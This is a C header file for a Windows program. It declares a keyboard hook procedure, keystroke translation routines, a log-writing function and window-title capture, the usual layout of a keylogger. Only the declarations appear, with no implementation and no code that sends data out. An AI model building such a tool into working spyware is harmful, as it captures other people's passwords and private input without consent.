#ifndef _HEADER_H
# define _HEADER_H

# include <Windows.h>
# include <Stdio.h> // à effacer

# include "structs.h"


void	StartKeyBoardHook();
LRESULT	__stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
void	ReleaseHook();

void	init_kb_status(int key_value);
short	key_zone(int key_value);
short	translate_key_value(int key_value);
short	analyse_keyboard_status(int key_value);

void	edit_log(short character);
void	window_title(void);

t_str	*add_str(t_str *begin, char *str, char c);
t_str	*add_list(t_str *begin);
t_str	*print_str(t_str *begin);
t_str	*free_list(t_str *begin);
int		cpt_index(t_str *begin);

#endif // _HEADER_H
